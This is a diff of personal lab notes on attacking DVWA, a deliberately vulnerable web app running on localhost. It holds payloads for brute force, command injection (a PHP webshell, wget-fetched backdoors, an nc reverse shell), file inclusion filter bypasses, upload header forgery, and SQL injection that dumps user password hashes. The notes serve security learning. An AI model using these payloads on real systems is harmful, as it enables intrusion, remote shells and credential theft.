@@ -1,10 +1,10 @@
-#bruteforce
-##low
-trying bruteforce with hydra (stuck. try again later):
-	hydra -L /usr/share/wordlists/jeanphorn-wordlist/usernames.txt -P /usr/share/wordlists/rockyou.txt -o hydra_output.txt -s 80 -f -v localhost http-form-post "/DVWA-master/vulnerabilities/brute/:username=^USER^:password=^PASS^:Login=Login"
+# bruteforce
+## low - impossible
+	just guessed admin:password
+	is it broken though?
 
-#command injection
-##low
+# command injection
+## low
 put ; and run commands.
 to upload webshell:
 	0; echo "<?php system(\$_REQUEST['cmd']))>" > command_injection_webshell.php
@@ -17,15 +17,26 @@ to upload reverse shell:
 	nc -l -p 2212
 	surf to http://127.0.0.1/DVWA-master/vulnerabilities/exec/php-reverse-shell.php
 
-##medium
+## medium
 	* <0; ls> didnt work
+	* <&& whoami> didnt work
+	* used "-V" and got the version of ping
+	* used "google" and got nothing
+	* used "google.com" to see it does accept strings
+	* used "google 2>&1" and recieved the error!
 	* <0 & ls> work!
 	* to upload backdoor: <0 & wget 127.0.0.1:2212/command_injection_medium_backdoor.php>
 	* to upload reverse shell: <0 & wget 127.0.0.1:2212/command_injection_medium_rev.php>
 
+## hard
+	* tried "-V" - didnt work
+	* tried redirecting STDERR again with "2>&1" - didnt work
+	* redirect to file ("google.com > tmp.tmp") appears to be working (took time, and can surf to tmp.tmp)
+	* redirect STDERR to file also works (google 2>tmp.tmp)
+	* "google || echo hi" worked!
 
-#File Inclusion
-##low
+# File Inclusion
+## low
 	* can include files with the variable "?page"
 	* include file4.php with "127.0.0.1/DVWA-master/vulnerabilities/fi/?page=file4.php"
 	* include /hackable/fi.php with "http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=../../hackable/flags/fi.php" 
@@ -41,16 +52,22 @@ to upload reverse shell:
 		** run "nc -l -p 3339"
 		** in the browser, surf to "http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=http://localhost:2212/php-reverse-shell.php"
 		** now you have shell on the nc terminal.
-##medium
+## medium
 	* the code removes tha patern <../> , so use <.../...//> instead.
 	* <.../...//.../...//hackable/flags/fi.php> works!
 	* seems like it doesnt like http as well... lets use the same trick! <h../t../t../p> instead of <http>.
 
-#File Upload
-##low
+## high
+	* for some reason, it returns and empty page with "file" as the included file name
+	* tried a bunch of stuff that didnt work
+	* then used the "file://" wrapper, which allows me to include files from the system in the file_get_contents function:
+	* http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=file:///var/www/html/DVWA-master/hackable/flags/fi.php
+
+# File Upload
+## low
 	* easy. just upload a shell. it prints the location of the uploaded file and everything.
 
-##medium
+## medium
 	* seems like it only accepts only JPEG and PNG files
 	* changing the file extention (like "shell.png" insted of "shell.php") doesnt work
 	* seems like when im trying to upload a php file there is a header like this:
@@ -59,8 +76,8 @@ to upload reverse shell:
 	  	<Content-Type: image/png>
 	* uploading a php file and changing the header in burp from <Content-Type: application/x-php> to <Content-Type: image/png> works!
 
-#SQLi
-##low
+# SQLi
+## low
 	* <bla' or '1'='1> works
 	* <' order by 3#> shows there are only 2 columns in the current query (probably First name, Surname)
 		* <bla' UNION SELECT 1,1#> shows the same thing.
@@ -90,14 +107,14 @@ to upload reverse shell:
 		cracked_password: password
 	* tried to write file to get shell shell with input <' into outfile 'bla.php'#> but got the error 'Access denied for user 'dvwa'@'localhost' (using password: YES)'. guess the mysql user can't write to files :(
 
-##medium
+## medium
 	* can put only numbers. send it to burp to put real data in the ID parameter in the request
 	* the code puts a backslash <\> before my <'>
 	* <id=1 UNION SELECT table_name,table_name FROM information_schema.tables> works
 	* <id=1 UNION SELECT user, password FROM users> works
 
-#SQLi Blind
-##low
+# SQLi Blind
+## low
 	* blaa' or '1'='1 works. 
 	* 1' or sleep(5)# works as well
 	* <bla' union select @@VERSION AS 'version1', @@VERSION AS 'version2'#> works
@@ -106,7 +123,7 @@ to upload reverse shell:
 	* <bla' union select @@version, table_name from information_schema.tables where @@version like '%3-MariaDB%'#> works
 	* <bla' union select @@version, table_name from information_schema.tables where @@version = '10.3.23-MariaDB-1'#> works
 
-##medium
+## medium
 	* like the regulat SQL medium level, can put only numbers. send it to burp to put real data in the ID parameter in the request
 	* the code does not exept <'> <id=1 or '1'='1'> failed.
 	* <id=8 UNION SELECT @@version, @@version FROM users> works
@@ -115,10 +132,10 @@ to upload reverse shell:
 	  meaning that the version is 10.3.23!
 
 
-#Weak Session IDs
-##low
+# Weak Session IDs
+## low
 	* the cookie "dvwaSession" is always incremented by 1.
-##medium
+## medium
 	* the cookie is an increasing date in ctime form.
 
 
